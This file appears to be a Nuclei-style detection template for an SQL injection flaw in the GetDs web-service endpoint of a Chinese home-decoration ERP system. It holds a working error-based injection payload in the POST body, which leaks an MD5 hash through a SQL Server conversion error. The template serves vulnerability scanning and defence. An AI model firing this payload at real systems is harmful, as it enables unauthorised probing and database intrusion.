id: poc-yaml-znfit-erp-ms-getds-sqli
info:
  name: 家装ERP管理系统 GetDs SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    This template identifies an SQL injection vulnerability in the 家装ERP管理系统's GetDs endpoint.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/WEB_SERVICE/Public.asmx/GetDs"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "tbName=sysusers&where=uid='1'+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "在将 nvarchar 值"
          - "0x{{t2}}"
          - "转换成数据类型 int 时失败"
      - type: word
        part: body
        words:
          - "<"
        negative: true
